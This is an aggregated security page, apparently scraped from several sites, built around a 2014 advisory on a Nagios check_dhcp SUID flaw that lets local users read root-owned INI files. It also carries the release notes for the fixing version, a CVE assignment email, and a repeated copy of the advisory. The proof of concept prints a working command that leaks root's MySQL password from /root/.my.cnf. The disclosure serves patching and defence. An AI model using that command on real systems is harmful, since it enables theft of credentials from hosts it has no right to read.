How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

```
=============================================
- Release date: 15.05.2014
- Discovered by: Dawid Golunski
- Severity: Moderate
=============================================

I. VULNERABILITY
-------------------------

check_dhcp - Nagios Plugins <= 2.0.1 Arbitrary Option File Read

II. BACKGROUND
-------------------------

"Nagios is an open source computer system monitoring, network monitoring and
infrastructure monitoring software application. Nagios offers monitoring and
alerting services for servers, switches, applications, and services.
It alerts the users when things go wrong and alerts them a second time when
the problem has been resolved.

Nagios Plugins (Official)

The Nagios Plugins Development Team maintains a bundle of more than fifty
standard plugins for Nagios and other monitoring applications that use the
straightforward plugin interface originally invented by the Nagios folks.
Each plugin is a stand-alone command line tool that provides a specific type
of check. Typically, your monitoring software runs these plugins to determine
the current status of hosts and services on your network.

Some of the provided plugins let you check local system metrics (such as load
averages, processes, or disk space usage), others use various network protocols
 (such as ICMP, SNMP, or HTTP) to perform remote checks.
This allows for checking a large number of common host and service types.

* check_dhcp plugin

This plugin tests the availability of DHCP servers on a network."

III. INTRODUCTION
-------------------------

check_dhcp plugin that is a part of the official Nagios Plugins package contains
a vulnerability that allows a malicious attacker to read parts of INI
config files belonging to root on a local system. It could allow an attacker
to obtain sensitive information like passwords that should only be accessible
by root user.

The vulnerability is due to check_dhcp plugin having Root SUID permissions and
inappropriate access control when reading user provided config file.

IV. DESCRIPTION
-------------------------

check_dhcp requires a root SUID permission on the program binary file in order to run
correctly. Default installation of check_dhcp when installed from sources assigns
the setuid bit automatically on the file:

# ./configure ; make ; make install

# ls -l /usr/local/nagios/libexec/check_dhcp
-r-sr-xr-x 1 root root 171188 May 12 23:26 /usr/local/nagios/libexec/check_dhcp

As we can see in the provided help the plugin allows for reading options from a
supplied config file by using --extra-opts option:

# /usr/local/nagios/libexec/check_dhcp --help
check_dhcp v2.0.1 (nagios-plugins 2.0.1)
...
Usage:
 check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
                  [-i interface] [-m mac]

Options:
...
 --extra-opts=[section][@file]
    Read options from an ini file. See
    https://www.nagios-plugins.org/doc/extra-opts.html
    for usage and examples.

The option could be used to read parts of any INI format config files
available on the system.  Because check_dhcp is running as root (thanks
to SETUID bit) and does not drop the root privileges when accessing the
config file nor does it check if a given file should be accessible by the
user executing it any root ini-config file can be accessed this way by an
unprivileged user on the local system.

Ironically, the extra-opts.html document states
"The initial use case for this functionality is for hiding passwords, so
you do not have to define sensitive credentials in the Nagios configuration
and these options won't appear in the command line."

V. PROOF OF CONCEPT
-------------------------

A good example of a program that stores configuration in INI format is MySQL.
Administrators often save mysql credentials in /root/.my.cnf to avoid having
to type them each time when running a mysql client. Storing mysql passwords in
a config file is also suggested for safety in MySQL docs :
http://dev.mysql.com/doc/refman/5.7/en/password-security-user.html

An example mysql config file could look like this:

# cat /root/.my.cnf
[mysqldump]
quick

[mysql]
# saved password for the mysql root user
password=myRootSecretMysqlPass123

If an unprivileged attacker had access to a system containing SUID binary of
check_dhcp plugin he could easily use it to retrieve the password contained
in /root/.my.cnf file:

[attacker@localhost ~]$ id
uid=500(attacker) gid=500(attacker) groups=500(attacker)

[attacker@localhost ~]$ /usr/local/nagios/libexec/check_dhcp -v --extra-opts=mysql@/root/.my.cnf
/usr/local/nagios/libexec/check_dhcp: unrecognized option '--password=myRootSecretMysqlPass123'
Usage:
 check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
                  [-i interface] [-m mac]

As we can see the contents of the 'mysql' section of /root/.my.cnf option
file gets printed  as a part of the error message revealing its contents to
the attacker.

VI. BUSINESS IMPACT
-------------------------

Malicious user that has local access to a system where check_dhcp plugin is
installed with SUID could exploit  this vulnerability to read any INI format
config files owned by root and  potentially extract some sensitive information.

VII. SYSTEMS AFFECTED
-------------------------

Systems with check_dhcp SUID binary installed as a part of Nagios Plugins 2.0.1 or older
are vulnerable.

VIII. SOLUTION
-------------------------

Remove SETUID permission bit from the check_dhcp binary file if the plugin is not used.
Vendor has been informed about the vulnerability prior to release of this advisory.
Install a newer version of the plugin when released by vendor.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Nagios Plugins 2.0.2 Released

The Nagios Plugins Development Team is proud to announce that [nagios-plugins 2.0.2](http://nagios-plugins.org/downloads/?utm_source=nagios-plugins.org&utm_medium=post&utm_content=Nagios%20Plugins%202.0.2%20Released&utm_campaign=Nagios%20Plugins "download nagios-plugins 2.0.2") has been released and is available for [download](http://nagios-plugins.org/downloads/?utm_source=nagios-plugins.org&utm_medium=post&utm_content=Nagios%20Plugins%202.0.2%20Released&utm_campaign=Nagios%20Plugins "download nagios-plugins 2.0.2").

This release was prompted a bit earlier than originally expected by a newly discovered security vulnerability reported by Dawid Golunski on [exploit-db](http://www.exploit-db.com/exploits/33387/ "exploit-db"). It concerned an arbitrary file access vulnerability with the SUID binaries (check\_icmp, check\_dhcp) and the extra-opts configure flag (which is enabled by default).  Fixes were applied globally, so the new restrictions on fopen should apply to all plugins.

Additionally, a few plugins were updated to successfully build on windows under cygwin, and some small changes were made to plugin output and verbosity.

A full list of included enhancements and fixes are listed below:

**SECURITY FIXES**

* Fixed file access vulnerability with SUID binaries (check\_icmp, check\_dhcp) and extra-opts.  Fixes were applied globally, so the new resrictions on fopen should apply to all plugins. Special thanks to Dawid Golunski for the submission. More information: [http://www.exploit-db.com/exploits/33387/](http://www.exploit-db.com/exploits/33387/ "exploit-db")  (sreinhardt) (emislivec)

**ENHANCEMENTS**

* check\_disk – Now compiles in cygwin on windows (Gunnar Beutner)
* check\_ping – Now compiles in cygwin on windows (Gunnar Beutner)
* check\_users – Now compiles in cygwin on windows (Gunnar Beutner)
* netutils.c – Connection error verbosity increased. C plugins will now differentiate file socket errors from connection errors (Davide Madrisan)

**FIXES**

* check\_nt.c – Changed ‘Mb’ to ‘MB’ in MEMUSE output for clarity (abrist)

Thanks to all who have contributed toward this release. If you need assistance installing or using the plugins, please visit our [general support forum](http://support.nagios.com/forum/viewforum.php?f=7?utm_source=nagios-plugins.org&utm_medium=post&utm_content=Nagios%20Plugins%202.0.2%20Released&utm_campaign=Nagios%20Plugins "Visit general support forum").

Subject: Re: CVE requests: nagios check_dhcp plug-in: read parts of INI config files belonging to root

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

This is a somewhat unusual situation for CVE because there are two
cases in which a researcher reported a subset of the problem, and then
a vendor fix was announced that apparently addressed the problem
without modifying the component mentioned by the researcher.

> <http://seclists.org/fulldisclosure/2014/May/74>
>
> This was fixed in version 2.0.2:
>
> <<http://nagios-plugins.org/nagios-plugins-2-0-2-released/>>

Use CVE-2014-4701 for the report in
<http://seclists.org/fulldisclosure/2014/May/74> stating that check_dhcp
is affected. (<http://nagios-plugins.org/nagios-plugins-2-0-2-released/>
is also an applicable reference for this CVE.)

Use CVE-2014-4702 for the report in
<http://nagios-plugins.org/nagios-plugins-2-0-2-released/> stating that
check_icmp is affected. This is new vector information announced at a
different time by a different party.

(From a practical perspective, someone might have been tracking Nagios
Plugins security on the basis of fulldisclosure posts, and decided to
"fix" <http://seclists.org/fulldisclosure/2014/May/74> by simply
deleting the check_dhcp plugin. In this case, CVE-2014-4702 is useful
because that installation was still vulnerable after that
CVE-2014-4701 remediation action.)

> <http://seclists.org/fulldisclosure/2014/Jun/141>
>
> This was fixed in version 2.0.3:
>
> <<http://nagios-plugins.org/nagios-plugins-2-0-3-released/>>

Use CVE-2014-4703 for the report in
<http://seclists.org/fulldisclosure/2014/Jun/141> stating that
check_dhcp is affected.
(<http://nagios-plugins.org/nagios-plugins-2-0-3-released/> is also an
applicable reference for this CVE.)

Here, the vendor did not announce any additional vector information
(and only referred to "the SUID vulnerability discovered by David
Golunski") so we can't assign a fourth CVE ID for the
<http://nagios-plugins.org/nagios-plugins-2-0-3-released/> post. It's
possible that this is actually a parallel situation, so if anyone
wants to announce an issue in 2.0.2 that's not specifically about
check_dhcp, an additional CVE ID could be assigned.

=============================================
- Release date: 15.05.2014
- Discovered by: Dawid Golunski
- Severity: Moderate
=============================================
I. VULNERABILITY
-------------------------
check\_dhcp - Nagios Plugins <= 2.0.1 Arbitrary Option File Read
II. BACKGROUND
-------------------------
"Nagios is an open source computer system monitoring, network monitoring and
infrastructure monitoring software application. Nagios offers monitoring and
alerting services for servers, switches, applications, and services.
It alerts the users when things go wrong and alerts them a second time when
the problem has been resolved.
Nagios Plugins (Official)
The Nagios Plugins Development Team maintains a bundle of more than fifty
standard plugins for Nagios and other monitoring applications that use the
straightforward plugin interface originally invented by the Nagios folks.
Each plugin is a stand-alone command line tool that provides a specific type
of check. Typically, your monitoring software runs these plugins to determine
the current status of hosts and services on your network.
Some of the provided plugins let you check local system metrics (such as load
averages, processes, or disk space usage), others use various network protocols
(such as ICMP, SNMP, or HTTP) to perform remote checks.
This allows for checking a large number of common host and service types.
\* check\_dhcp plugin
This plugin tests the availability of DHCP servers on a network."
III. INTRODUCTION
-------------------------
check\_dhcp plugin that is a part of the official Nagios Plugins package contains
a vulnerability that allows a malicious attacker to read parts of INI
config files belonging to root on a local system. It could allow an attacker
to obtain sensitive information like passwords that should only be accessible
by root user.
The vulnerability is due to check\_dhcp plugin having Root SUID permissions and
inappropriate access control when reading user provided config file.
IV. DESCRIPTION
-------------------------
check\_dhcp requires a root SUID permission on the program binary file in order to run
correctly. Default installation of check\_dhcp when installed from sources assigns
the setuid bit automatically on the file:
# ./configure ; make ; make install
# ls -l /usr/local/nagios/libexec/check\_dhcp
-r-sr-xr-x 1 root root 171188 May 12 23:26 /usr/local/nagios/libexec/check\_dhcp
As we can see in the provided help the plugin allows for reading options from a
supplied config file by using --extra-opts option:
# /usr/local/nagios/libexec/check\_dhcp --help
check\_dhcp v2.0.1 (nagios-plugins 2.0.1)
...
Usage:
check\_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
[-i interface] [-m mac]
Options:
...
--extra-opts=[section][@file]
Read options from an ini file. See
https://www.nagios-plugins.org/doc/extra-opts.html
for usage and examples.
The option could be used to read parts of any INI format config files
available on the system. Because check\_dhcp is running as root (thanks
to SETUID bit) and does not drop the root privileges when accessing the
config file nor does it check if a given file should be accessible by the
user executing it any root ini-config file can be accessed this way by an
unprivileged user on the local system.
Ironically, the extra-opts.html document states
"The initial use case for this functionality is for hiding passwords, so
you do not have to define sensitive credentials in the Nagios configuration
and these options won't appear in the command line."
V. PROOF OF CONCEPT
-------------------------
A good example of a program that stores configuration in INI format is MySQL.
Administrators often save mysql credentials in /root/.my.cnf to avoid having
to type them each time when running a mysql client. Storing mysql passwords in
a config file is also suggested for safety in MySQL docs :
http://dev.mysql.com/doc/refman/5.7/en/password-security-user.html
An example mysql config file could look like this:
# cat /root/.my.cnf
[mysqldump]
quick
[mysql]
# saved password for the mysql root user
password=myRootSecretMysqlPass123
If an unprivileged attacker had access to a system containing SUID binary of
check\_dhcp plugin he could easily use it to retrieve the password contained
in /root/.my.cnf file:
[attacker@localhost ~]$ id
uid=500(attacker) gid=500(attacker) groups=500(attacker)
[attacker@localhost ~]$ /usr/local/nagios/libexec/check\_dhcp -v --extra-opts=mysql@/root/.my.cnf
/usr/local/nagios/libexec/check\_dhcp: unrecognized option '--password=myRootSecretMysqlPass123'
Usage:
check\_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
[-i interface] [-m mac]
As we can see the contents of the 'mysql' section of /root/.my.cnf option
file gets printed as a part of the error message revealing its contents to
the attacker.
VI. BUSINESS IMPACT
-------------------------
Malicious user that has local access to a system where check\_dhcp plugin is
installed with SUID could exploit this vulnerability to read any INI format
config files owned by root and potentially extract some sensitive information.
VII. SYSTEMS AFFECTED
-------------------------
Systems with check\_dhcp SUID binary installed as a part of Nagios Plugins 2.0.1 or older
are vulnerable.
VIII. SOLUTION
-------------------------
Remove SETUID permission bit from the check\_dhcp binary file if the plugin is not used.
Vendor has been informed about the vulnerability prior to release of this advisory.
Install a newer version of the plugin when released by vendor.
